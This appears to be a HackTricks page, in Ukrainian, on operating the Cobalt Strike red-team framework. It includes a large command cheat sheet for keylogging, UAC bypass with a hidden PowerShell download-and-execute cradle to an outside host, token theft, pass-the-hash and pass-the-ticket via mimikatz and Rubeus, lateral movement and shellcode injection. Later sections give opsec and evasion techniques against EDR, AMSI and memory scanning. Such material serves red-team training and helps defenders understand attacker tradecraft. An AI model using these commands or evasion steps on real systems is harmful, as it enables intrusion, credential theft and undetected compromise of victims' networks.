# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit`, після чого можна вибрати, де прослуховувати з'єднання, який тип beacon використовувати (http, dns, smb...) тощо.

### Peer2Peer Listeners

Beacon-и цих listeners не повинні безпосередньо взаємодіяти з C2: вони можуть підключатися до нього через інші beacon-и.

`Cobalt Strike -> Listeners -> Add/Edit`, після чого потрібно вибрати TCP- або SMB-beacon-и.

* **TCP beacon встановить listener на вибраному порту**. Щоб підключитися до TCP beacon, використовуйте команду `connect <ip> <port>` з іншого beacon-а.
* **SMB beacon прослуховуватиме pipename із вибраним ім'ям**. Щоб підключитися до SMB beacon, потрібно використати команду `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** для HTA-файлів
* **`MS Office Macro`** для документа Office із macro
* **`Windows Executable`** для .exe, .dll або service .exe
* **`Windows Executable (S)`** для **stageless** .exe, .dll або service .exe (stageless кращий за staged, оскільки має менше IoC)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` згенерує script/executable для завантаження beacon-а з Cobalt Strike у таких форматах: bitsadmin, exe, powershell і python.

#### Host Payloads

Якщо у вас уже є файл, який потрібно розмістити на web server, перейдіть до `Attacks -> Web Drive-by -> Host File`, виберіть файл для розміщення та конфігурацію web server.

### Beacon Options

<details>
<summary>Beacon options and commands</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Користувацькому агенту потрібно лише використовувати протокол HTTP/S Cobalt Strike Team Server (стандартний malleable C2 profile) для реєстрації/check-in та отримання завдань. Реалізуйте ті самі URI/заголовки/криптографію метаданих, визначені у профілі, щоб повторно використовувати інтерфейс Cobalt Strike для керування завданнями та отримання результатів.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script (наприклад, `CustomBeacon.cna`) може обгортати генерацію payload для non-Windows beacon, щоб оператори могли вибирати listener і безпосередньо створювати ELF payloads через GUI.
- Приклади Linux task handlers, доступних для Team Server: `sleep`, `cd`, `pwd`, `shell` (виконання довільних команд), `ls`, `upload`, `download` і `exit`. Вони відповідають task IDs, очікуваним Team Server, і мають бути реалізовані на стороні сервера для повернення результатів у належному форматі.
- Підтримку BOF у Linux можна додати, завантажуючи Beacon Object Files in-process за допомогою [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (також підтримує BOFs у стилі Outflank), що дає змогу запускати модульний post-exploitation у контексті та з привілеями implant без створення нових процесів.<sup>[[2]](#references)[[3]](#references)</sup>
- Вбудуйте SOCKS handler у custom beacon, щоб зберегти відповідність можливостей pivoting у Windows Beacons: коли оператор виконує `socks <port>`, implant має відкрити локальний proxy для маршрутизації інструментів оператора через скомпрометований Linux host до внутрішніх мереж.

## Opsec

### Execute-Assembly

**`execute-assembly`** використовує **sacrificial process** із застосуванням remote process injection для виконання вказаної програми. Це дуже помітно, оскільки для ін'єкції в процес використовуються певні Win APIs, які перевіряє кожен EDR. Однак існують custom tools, за допомогою яких можна завантажити щось у той самий процес:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- У Cobalt Strike також можна використовувати BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Aggressor script `https://github.com/outflanknl/HelpColor` створить команду `helpx` у Cobalt Strike, яка додаватиме кольори до команд, позначаючи, чи є вони BOFs (зеленим), Frok&Run (жовтим) тощо, або ProcessExecution, injection чи подібними (червоним). Це допомагає визначати, які команди є більш stealthy.

### Act as the user

Можна перевірити такі події, як `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 — перевірте всі interactive logons, щоб визначити звичайні години роботи.
- System EID 12,13 — перевірте частоту вимкнення/запуску/переходу в режим сну.
- Security EID 4624/4625 — перевірте вхідні дійсні/недійсні NTLM attempts.
- Security EID 4648 — ця подія створюється, коли для logon використовуються plaintext credentials. Якщо її створив процес, binary потенційно містить credentials у clear text у config file або всередині коду.

Під час використання `jump` у cobalt strike краще застосовувати метод `wmi_msbuild`, щоб новий процес виглядав більш легітимно.

### Use computer accounts

Захисники часто перевіряють незвичну поведінку, створену користувачами, і **виключають service accounts та computer accounts, як-от `*$`, зі свого моніторингу**. Можна використовувати ці accounts для lateral movement або privilege escalation.

### Use stageless payloads

Stageless payloads менш помітні, ніж staged payloads, оскільки їм не потрібно завантажувати другий stage із C2 server. Це означає, що після початкового підключення вони не створюють мережевого трафіку, тому їх із меншою ймовірністю виявлять network-based defenses.

### Tokens & Token Store

Будьте обережні під час крадіжки або створення tokens, оскільки EDR може перераховувати thread tokens і виявити **token, що належить іншому користувачеві**, або навіть SYSTEM усередині процесу.

Це дає змогу зберігати tokens **для кожного beacon**, тому не потрібно красти той самий token знову й знову. Це корисно для lateral movement або коли потрібно використати stolen token кілька разів:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Під час lateral movement зазвичай краще **викрасти token, а не створювати новий** або виконувати pass the hash attack.

### Guardrails

Cobalt Strike має функцію під назвою **Guardrails**, яка допомагає запобігати використанню певних команд або дій, що можуть бути виявлені захисниками. Guardrails можна налаштувати для блокування конкретних команд, таких як `make_token`, `jump`, `remote-exec` та інших, які часто використовуються для lateral movement або privilege escalation.

Крім того, repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) також містить деякі перевірки та ідеї, які можна врахувати перед виконанням payload.

### Tickets encryption

В AD будьте уважні до шифрування tickets. За замовчуванням деякі tools використовують RC4 encryption для Kerberos tickets, яка є менш безпечною за AES encryption, а в актуальних середовищах за замовчуванням використовується AES. Це можуть виявити захисники, які відстежують weak encryption algorithms.

### Avoid Defaults

Під час використання Cobalt Stricke за замовчуванням SMB pipes матимуть назви `msagent_####` і `"status_####"`. Змініть ці назви. Перевірити назви наявних pipes у Cobal Strike можна командою: `ls \\.\pipe\`

Крім того, під час SSH sessions створюється pipe під назвою `\\.\pipe\postex_ssh_####`. Змініть його за допомогою `set ssh_pipename "<new_name>";`.

Також під час post-exploitation attack pipes `\\.\pipe\postex_####` можна змінити за допомогою `set pipename "<new_name>"`.

У Cobalt Strike profiles також можна змінювати такі параметри:

- Уникнення використання `rwx`
- Принцип роботи process injection (які APIs використовуватимуться) у блоці `process-inject {...}`
- Принцип роботи "fork and run" у блоці `post-ex {…}`
- Час сну
- Максимальний розмір binaries, які завантажуються в memory
- Обсяг memory та вміст DLL за допомогою блоку `stage {...}`
- Мережевий трафік

### Bypass memory scanning

Деякі ERDs сканують memory на наявність відомих malware signatures. Coblat Strike дає змогу змінити функцію `sleep_mask` на BOF, який зможе шифрувати backdoor у memory.

### Noisy proc injections

Ін'єкція коду в процес зазвичай є дуже помітною, оскільки **звичайні процеси зазвичай не виконують таку дію, а способи її виконання дуже обмежені**. Тому її можуть виявляти behaviour-based detection systems. Крім того, це можуть виявляти EDR, які сканують memory на наявність **threads, що містять код, відсутній на диску** (хоча такі процеси, як browsers, що використовують JIT, часто працюють саме так). Приклад: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Під час створення нового процесу важливо **зберігати типовий parent-child** зв'язок між процесами, щоб уникнути виявлення. Якщо svchost.exec запускає iexplorer.exe, це виглядатиме підозріло, оскільки svchost.exe не є parent для iexplorer.exe у звичайному середовищі Windows.

Коли в Cobalt Strike за замовчуванням створюється новий beacon, для запуску нового listener створюється процес із використанням **`rundll32.exe`**. Це не дуже stealthy, і його легко виявити за допомогою EDR. Крім того, `rundll32.exe` запускається без будь-яких args, що робить його ще підозрілішим.

За допомогою наведеної нижче команди Cobalt Strike можна вказати інший процес для створення нового beacon, що зробить його менш помітним:
```bash
spawnto x86 svchost.exe
```
Ви також можете змінити це налаштування **`spawnto_x86` і `spawnto_x64`** у профілі.

### Проксування трафіку атакуючого

Іноді атакуючому потрібно мати змогу локально запускати інструменти, навіть на Linux-машинах, і спрямовувати трафік жертв до цього інструмента (наприклад, для NTLM relay).

Крім того, іноді для виконання атаки pass-the-hash або pass-the-ticket атакуючому буде непомітніше **додати цей hash або ticket у власний процес LSASS** локально, а потім виконати pivot через нього, замість модифікації процесу LSASS на машині жертви.

Однак потрібно бути **обережним зі згенерованим трафіком**, оскільки ви можете надсилати нетиповий трафік (Kerberos?) зі свого backdoor-процесу. Для цього можна виконати pivot до процесу браузера (хоча вас можуть виявити під час інʼєкції у власний процес, тому продумайте stealth-спосіб виконання цього).


### Уникнення AV

#### Обхід AV/AMSI/ETW

Перегляньте сторінку:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Зазвичай у `/opt/cobaltstrike/artifact-kit` можна знайти код і попередньо скомпільовані шаблони (у `/src-common`) payloads, які Cobalt Strike використовує для генерації binary Beacon.

За допомогою [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) зі згенерованим backdoor (або просто зі скомпільованим шаблоном) можна визначити, що саме спричиняє спрацювання Defender. Зазвичай це рядок. Тому можна просто змінити код, який генерує backdoor, щоб цей рядок не зʼявлявся у фінальному binary.

Після зміни коду просто запустіть `./build.sh` з тієї самої директорії та скопіюйте папку `dist-pipe/` на Windows-клієнт у `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Не забудьте завантажити aggressive script `dist-pipe\artifact.cna`, щоб вказати Cobalt Strike використовувати потрібні нам ресурси з диска, а не завантажені.

#### Resource Kit

Папка ResourceKit містить шаблони для payloads Cobalt Strike на основі скриптів, зокрема PowerShell, VBA та HTA.

Використовуючи [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) із шаблонами, можна визначити, що саме не подобається defender (у цьому випадку AMSI), і змінити це:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Змінюючи виявлені рядки, можна створити шаблон, який не буде виявлено.

Не забудьте завантажити aggressive script `ResourceKit\resources.cna`, щоб указати Cobalt Strike використовувати потрібні нам resources із диска, а не завантажені resources.

#### Перехоплення функцій | Syscall

Перехоплення функцій є дуже поширеним методом EDR для виявлення шкідливої активності. Cobalt Strike дає змогу обійти ці hooks, використовуючи **syscalls** замість стандартних викликів Windows API за допомогою конфігурації **`None`**, або використовувати версію функції `Nt*` з налаштуванням **`Direct`**, або просто перескочити через функцію `Nt*` за допомогою опції **`Indirect`** у malleable profile. Залежно від системи один варіант може бути stealthier за інший.

Це можна налаштувати у profile або за допомогою команди **`syscall-method`**

Однак це також може бути noisy.

Одна з можливостей Cobalt Strike для обходу function hooks — видалити ці hooks за допомогою [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Також можна перевірити, які функції перехоплюються, за допомогою [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) або [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Різні команди Cobalt Strike</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## References

- [1] [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader і Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Шаблон nix BOF від Outflank](https://github.com/outflanknl/nix_bof_template)
- [4] [Аналіз Unit42 шифрування метаданих Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Щоденник SANS ISC про трафік Cobalt Strike](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
{{#include ../banners/hacktricks-training.md}}
